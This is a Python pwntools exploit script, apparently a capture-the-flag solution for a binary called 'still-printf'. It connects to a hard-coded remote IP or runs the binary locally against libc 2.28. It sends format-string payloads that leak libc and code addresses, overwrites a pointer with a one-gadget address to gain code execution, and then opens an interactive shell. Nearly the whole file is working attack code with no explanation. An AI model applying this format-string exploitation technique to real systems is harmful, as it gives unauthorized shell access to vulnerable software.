#!/usr/bin/env python
from pwn import *
import sys
import os
from time import sleep

'''
b*0x00007ffff7e6661d
c
set {long}0x7fffffffed28 = 0x00005555555550C0
b execve
'''

remote_ip,port = '168.119.161.224',9509
binary = ['./still-printf']
brkpts = '''
'''
#context.aslr = False
if len(sys.argv)>1:
    io = remote(remote_ip,port)

else:
    io = process(binary,env = {"LD_PRELOAD" : "./libc-2.28.so"})

ru = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)


def get_length(a,b):
    while(hex(a)[-2:]!=b):
        a = a+1
    return a

def fstring_payload(addr,offset,waddr):
    addr=hex(addr).replace("0x","")
    if len(addr)<16:
        addr=addr.rjust(16,"0")
    var1=int(addr[-4:],16)
    s2=addr[-6:-4]
    var2=get_length(var1,s2)-var1
    payload = "%{}c%{}$hn%{}c%{}$hhn".format(var1,offset+3,var2,offset+4).ljust(24,"a")
    payload += p64(waddr) + p64(waddr+2)
    return payload

if __name__ == "__main__":
    #gdb.attach(io, brkpts)
    payload =  '%p' + '%{}d'.format(40-12-14) + '%c'*12 + '%hn' + '%152d' + '%41$hhn' + '%p'
    s(payload)
    #print(hex(len(payload)))
    ru("0x")
    libc = int("0x"+re(12),16)-0x1bd8d0
    log.info("Libc : "+hex(libc))
    gadgets = [libc+0x4484f, libc+0x448a3,libc + 0x448af,libc + 0xc70ca,libc + 0xc70cd, libc + 0xc70d0 ,libc+ 0xe5456]
    ru("0x")
    code = int("0x"+re(12),16)-0x10c0
    log.info("Code base : "+hex(code))
    exit_got = code + 0x3380
    payload2 = fstring_payload(gadgets[6], 6, libc + 0x1eff68) #5,#6
    sl(payload2)
    io.sendline("ls")
    try:
        print(io.recvline())
        io.interactive()
    except:
        pass
    #io.interactive()
